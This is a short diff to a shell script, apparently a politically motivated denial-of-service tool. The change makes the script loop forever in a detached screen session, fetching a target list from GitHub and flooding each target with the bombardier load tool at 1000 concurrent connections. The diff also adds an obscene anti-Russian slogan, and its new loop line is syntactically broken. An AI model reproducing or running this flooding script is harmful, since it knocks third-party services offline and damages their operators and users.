@@ -639,8 +639,9 @@ else
 	do_install
 fi
 
+echo "Русский корабль, иди нахуй! Можно отсоединяться, дальше я сам :)"
 screen -dm bash -c '
-for i in {1..2}; do
+while true do
 	curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list > /tmp/list
 	while read p; do
 	  docker run -it alpine/bombardier -c 1000 -d 60s -l "$p"
